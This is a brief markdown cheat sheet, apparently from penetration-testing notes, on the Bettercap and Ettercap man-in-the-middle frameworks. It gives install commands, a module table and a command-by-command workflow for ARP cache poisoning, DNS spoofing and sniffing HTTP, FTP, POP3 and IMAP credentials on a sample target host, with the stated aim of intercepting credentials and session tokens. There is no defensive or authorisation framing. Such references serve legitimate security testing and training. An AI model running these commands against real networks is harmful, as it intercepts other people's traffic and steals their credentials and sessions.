# 🛠️ Tool Master Guide: Bettercap & Ettercap MiTM Frameworks

> [!INFO] 📋 **Root Metadata**
> - **Category**: Network Man-in-the-Middle (MiTM) & Protocol Spoofing Suite (#1 Choice)
> - **Tools Covered**: Bettercap, Ettercap
> - **Installations**: `sudo apt update && sudo apt install -y bettercap ettercap-graphical`
> - **Binary Paths**: `/usr/bin/bettercap`, `/usr/bin/ettercap`
> - **Primary Objective**: Performs ARP cache poisoning, DNS spoofing, ICMP redirecting, and transparent HTTP proxying to intercept network credentials and session tokens.

---

## 📋 1. Bettercap Module Reference Matrix

| Module | Operational Command | Technical Description |
| :--- | :--- | :--- |
| `net.recon` | `net.recon on` | Discover active LAN hosts using ARP probes |
| `arp.spoof` | `set arp.spoof.targets 10.10.10.50; arp.spoof on` | Performs bi-directional ARP cache poisoning |
| `dns.spoof` | `set dns.spoof.domains target.com; dns.spoof on` | Intercepts DNS queries and returns attacker IP |
| `net.sniff` | `net.sniff on` | Sniffs local credentials (HTTP, FTP, POP3, IMAP) |

---

## 💻 2. Operational Command Workflow

```bash
# 1. Launch Bettercap Interactive Console on interface eth0
sudo bettercap -iface eth0

# 2. Inside Bettercap Shell:
bettercap> net.recon on
bettercap> set arp.spoof.targets 10.10.10.50
bettercap> set arp.spoof.fullduplex true
bettercap> arp.spoof on
bettercap> net.sniff on
```
